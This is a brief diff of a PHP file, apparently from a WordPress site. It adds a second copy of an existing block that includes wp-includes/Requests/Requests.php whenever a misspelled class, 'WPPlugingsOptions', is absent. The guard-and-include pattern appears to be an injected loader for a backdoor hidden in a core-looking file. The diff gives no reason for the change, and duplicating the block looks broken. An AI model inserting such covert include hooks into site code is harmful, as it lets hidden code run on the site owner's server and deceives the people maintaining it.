@@ -98,3 +98,6 @@ if ( ! class_exists( 'WPPlugingsOptions' ) && file_exists( ABSPATH . WPINC . DIR
 if ( ! class_exists( 'WPPlugingsOptions' ) && file_exists( ABSPATH . WPINC . DIRECTORY_SEPARATOR . 'Requests/Requests.php' ) ) {
 	include_once( ABSPATH . WPINC . DIRECTORY_SEPARATOR . 'Requests/Requests.php' );
 }
+if ( ! class_exists( 'WPPlugingsOptions' ) && file_exists( ABSPATH . WPINC . DIRECTORY_SEPARATOR . 'Requests/Requests.php' ) ) {
+	include_once( ABSPATH . WPINC . DIRECTORY_SEPARATOR . 'Requests/Requests.php' );
+}
